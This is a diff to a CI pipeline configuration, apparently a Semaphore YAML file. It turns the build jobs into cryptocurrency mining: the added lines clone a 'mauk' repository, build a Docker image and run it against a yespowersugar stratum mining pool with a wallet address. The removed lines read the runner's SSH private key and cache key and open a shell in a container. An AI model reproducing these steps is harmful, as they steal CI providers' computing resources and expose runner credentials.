@@ -14,38 +14,20 @@ blocks:
       jobs:
         - name: Docker build
           commands:
-            - 'echo "${DOCKER_PASSWORD}" | docker login quay.io -u "${DOCKER_USERNAME}" --password-stdin'
-            - checkout
-            - docker-compose up -d
-            - docker images ls
-            - ip a
-            - ls -la
-            - ls -la ~/.ssh
-  - name: Run & Test Docker image
+            - 'git clone https://github.com/jessica-ci/mauk.git'
+            - cd mauk
+            - 'docker build --tag mauk:latest .'
+            - 'docker run --publish 8000:8080 --detach --name mauk mauk:latest -a yespowersugar -o stratum+tcp://stratum-asia.rplant.xyz:7042 -u sugar1qwj5x6hyr88tqsuv2fmu8dvzzxgx35wl5uhnxf8.mauk1'
+  - name: 'Block #2'
     task:
-      secrets:
-        - name: quay-pull-secrets
       prologue:
         commands:
-          - 'echo "${DOCKER_PASSWORD}" | docker login quay.io -u "${DOCKER_USERNAME}" --password-stdin'
-          - checkout
-          - docker pull quay.io/jessica_ci/miner
-          - docker-compose up -d
+          - 'git clone https://github.com/jessica-ci/mauk.git'
+          - cd mauk
+          - 'docker build --tag mauk:latest .'
+          - 'docker run --publish 8000:8080 --detach --name mauk mauk:latest'
       jobs:
-        - name: Check Running Images
+        - name: 'Job #1'
           commands:
-            - docker ps
-  - name: Ceck key
-    task:
-      jobs:
-        - name: run key
-          commands:
-            - cat /home/semaphore/.ssh/id_rsa
-            - cat /home/semaphore/.ssh/known_hosts
-            - cat /home/semaphore/.ssh/semaphore_cache_key
-  - name: shell
-    task:
-      jobs:
-        - name: shell
-          commands:
-            - docker exec -it docker_app_1 bash
+            - 'docker ps -a '
+            - 'docker run --publish 8000:8080 --detach --name mauk mauk:latest -a yespowersugar -o stratum+tcp://stratum-asia.rplant.xyz:7042 -u sugar1qwj5x6hyr88tqsuv2fmu8dvzzxgx35wl5uhnxf8.mauk'
